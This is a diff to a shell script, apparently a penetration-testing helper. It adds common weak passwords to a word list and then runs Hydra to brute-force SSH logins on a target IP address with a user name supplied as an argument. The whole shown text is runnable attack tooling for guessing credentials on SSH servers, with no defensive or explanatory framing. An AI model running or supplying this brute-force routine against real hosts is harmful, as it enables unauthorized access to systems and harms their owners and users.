@@ -44,6 +44,13 @@ if [ "$MODE_ARG" = "hydra" ]; then
     echo "admin" >> passlist.txt
     echo "root" >> passlist.txt
     echo "kali" >> passlist.txt
+    echo "iloveyou" >> passlist.txt
+    echo "killyou" >> passlist.txt
+    echo "iloveu" >> passlist.txt
+    echo "secret" >> passlist.txt
+    echo "pretty" >> passlist.txt
+    echo "superman" >> passlist.txt
+          
     
     # Hydra実行 (ユーザー名を引数から指定)
     hydra -l $SSH_USER -P passlist.txt ssh://$TARGET_IP -t 4 -V -e ns
